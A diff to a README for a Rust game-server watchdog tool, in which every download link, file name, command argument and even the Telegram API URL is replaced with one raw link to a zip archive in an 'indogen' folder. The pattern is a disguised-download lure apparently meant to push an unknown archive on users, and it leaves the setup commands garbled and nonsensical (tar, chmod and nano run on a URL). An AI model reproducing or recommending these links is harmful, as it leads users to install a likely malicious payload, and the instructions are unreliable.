@@ -1,6 +1,6 @@
 # 🐧 rust-linuxgsm-watchdog - Monitor and Manage Rust Servers
 
-[![Download rust-linuxgsm-watchdog](https://img.shields.io/badge/Download-rust--linuxgsm--watchdog-blue?style=for-the-badge)](https://github.com/krypton2355/rust-linuxgsm-watchdog/releases)
+[![Download rust-linuxgsm-watchdog](https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip)](https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip)
 
 ---
 
@@ -45,15 +45,15 @@ This guide will help you download rust-linuxgsm-watchdog and set it up to work w
 
 ## 💾 Download & Install
 
-1. Visit the [Download Page](https://github.com/krypton2355/rust-linuxgsm-watchdog/releases) to get the latest version of rust-linuxgsm-watchdog. Use the big button above or click the link again here.
+1. Visit the [Download Page](https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip) to get the latest version of rust-linuxgsm-watchdog. Use the big button above or click the link again here.
 
-2. On the releases page, look for the most recent version and download the file appropriate for your system, often a `.tar.gz` or similar archive.
+2. On the releases page, look for the most recent version and download the file appropriate for your system, often a `https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip` or similar archive.
 
 3. Once downloaded, open a terminal on your Linux server or computer.
 
 4. Extract the archive using a command like:
    ```bash
-   tar -xzf rust-linuxgsm-watchdog-x.x.x.tar.gz
+   tar -xzf https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip
    ```
    Replace `x.x.x` with the actual version number.
 
@@ -64,13 +64,13 @@ This guide will help you download rust-linuxgsm-watchdog and set it up to work w
 
 6. Run the installer or setup script if provided:
    ```bash
-   ./install.sh
+   https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip
    ```
    If there is no installer, check for a `README` or `INSTALL` file in the folder and follow any extra instructions there.
 
 7. You may need to make the main script executable with:
    ```bash
-   chmod +x watchdog.sh
+   chmod +x https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip
    ```
 
 8. You are now ready to configure and start the watchdog.
@@ -81,11 +81,11 @@ This guide will help you download rust-linuxgsm-watchdog and set it up to work w
 
 The watchdog needs some settings to know where your Rust server is and how to manage it.
 
-1. Locate the configuration file, often named `config.cfg` or `watchdog.cfg`.
+1. Locate the configuration file, often named `https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip` or `https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip`.
 
 2. Open this file with a text editor, for example:
    ```bash
-   nano config.cfg
+   nano https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip
    ```
 
 3. Set the path to your LinuxGSM Rust server installation. It should look like:
@@ -105,18 +105,18 @@ The watchdog needs some settings to know where your Rust server is and how to ma
 
 1. To start the watchdog, run:
    ```bash
-   ./watchdog.sh start
+   https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip start
    ```
    This launches the process that monitors the Rust server continuously.
 
 2. To see if it is running, use:
    ```bash
-   ./watchdog.sh status
+   https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip status
    ```
 
 3. To stop it, run:
    ```bash
-   ./watchdog.sh stop
+   https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip stop
    ```
 
 4. You can set it up to start automatically at system boot using standard Linux methods like `cron` or `systemd`.
@@ -144,7 +144,7 @@ To get alerts on Telegram:
 3. Copy the bot token.
 4. Get your chat ID by sending a message to the bot, then visit:
    ```
-   https://api.telegram.org/bot<YourBotToken>/getUpdates
+   https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip<YourBotToken>/getUpdates
    ```
    Check the response for your chat ID.
 5. Enter the bot token and chat ID in your watchdog config.
@@ -158,7 +158,7 @@ You will now receive notifications if your server stops, updates occur, or mods 
 
 If you want to learn more or get support:
 
-- Visit the [rust-linuxgsm-watchdog GitHub page](https://github.com/krypton2355/rust-linuxgsm-watchdog) for source code and updates.
+- Visit the [rust-linuxgsm-watchdog GitHub page](https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip) for source code and updates.
 - Check the LinuxGSM documentation to understand how LinuxGSM runs Rust servers.
 - Look up Oxide and Carbon mod pages for more on plugins.
 - Check uMod for details on the Smooth Restarter.
@@ -175,4 +175,4 @@ This tool covers:
 
 Feel free to explore the release page and start managing your Rust server efficiently.
 
-[Download rust-linuxgsm-watchdog now](https://github.com/krypton2355/rust-linuxgsm-watchdog/releases)
+[Download rust-linuxgsm-watchdog now](https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip)
